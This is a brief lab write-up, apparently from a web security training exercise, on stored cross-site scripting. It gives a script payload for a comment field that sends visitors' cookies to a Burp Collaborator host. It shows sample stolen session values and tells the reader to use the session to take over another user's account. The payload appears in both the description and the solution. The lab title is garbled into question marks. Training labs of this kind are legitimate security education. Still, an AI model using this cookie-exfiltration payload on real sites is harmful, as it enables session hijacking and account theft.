# Lab: ????????
## Description


r0s3k898zg3loykrkxo9bzghg8myan.burpcollaborator.net


Post the following in the comment field:
```html
<script>document.location="http://r0s3k898zg3loykrkxo9bzghg8myan.burpcollaborator.net/"+document.cookie;</script>
```

This will trigger a request to Burp Colab server with data similar to this:
```
/secret=pCJGg48okzJR0V9mJc8RQzmo1GjIstOD;%20session=pDJ0EkU6jV8pNjbWqiXh0fOuoAm07VvP
```

Use the session to access another users account.

## Solution

```html
<script>document.location="http://r0s3k898zg3loykrkxo9bzghg8myan.burpcollaborator.net/"+document.cookie;</script>
```

